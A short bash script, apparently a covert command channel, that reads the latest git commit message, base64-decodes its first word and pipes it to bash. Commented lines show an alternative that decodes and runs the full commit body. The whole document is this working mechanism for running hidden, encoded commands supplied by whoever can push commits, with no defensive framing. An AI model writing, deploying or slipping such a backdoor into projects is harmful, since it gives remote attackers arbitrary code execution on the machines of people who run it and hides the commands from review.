#!/bin/bash
#$1 is the commit id, $2 is the command
commit=$(git log --pretty=oneline --abbrev-commit | awk '{print $2}' | head -n 1)
echo ${commit} | base64 -d | bash


#echo $commit
# The message will be base64
#commit_msg=$(git log --format=%B -n 1 $commit)
#echo $commit_msg | base64 -d | bash
#decode=$(echo $commit_msg | base64 -D)
